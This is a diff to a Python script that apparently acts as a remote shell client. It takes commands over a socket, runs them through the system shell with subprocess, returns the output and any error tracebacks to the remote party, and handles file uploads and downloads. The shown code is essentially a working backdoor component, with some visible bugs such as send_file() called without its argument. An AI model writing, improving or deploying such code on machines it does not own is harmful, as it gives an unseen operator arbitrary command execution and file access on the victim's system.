@@ -1,6 +1,9 @@
 import os
 import socket
 import subprocess
+import logging
+import io
+import traceback
 
 
 def recieve_file(dest_location): # run when client wants to upload file
@@ -44,7 +47,7 @@ def send_file(local_location): # run when client want to download file
         to_send.append(chunk)
         chunk = f.read(1024)
 
-    send_string_as_kb(len(to_send))  # TODO probably will need to add some 0-s in the last kb
+    send_string_as_kb(str(len(to_send)))  # TODO probably will need to add some 0-s in the last kb
 
     for kb in to_send:
         con.send(kb)
@@ -96,5 +99,23 @@ while True:
             command, dest_location, local_location = map(str, command.split())
             send_file()
         else:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
-            send_string_as_kb(result)
+
+            try:
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
+                send_string_as_kb(result)
+            except:
+                logger = logging.getLogger('basic_logger')
+                logger.setLevel(logging.DEBUG)
+
+                log_capture_string = io.StringIO()
+                ch = logging.StreamHandler(log_capture_string)
+                ch.setLevel(logging.DEBUG)
+
+                logger.addHandler(ch)
+
+                logger.error(traceback.format_exc())
+
+                log_contents = log_capture_string.getvalue()
+                log_capture_string.close()
+
+                send_string_as_kb(log_contents)
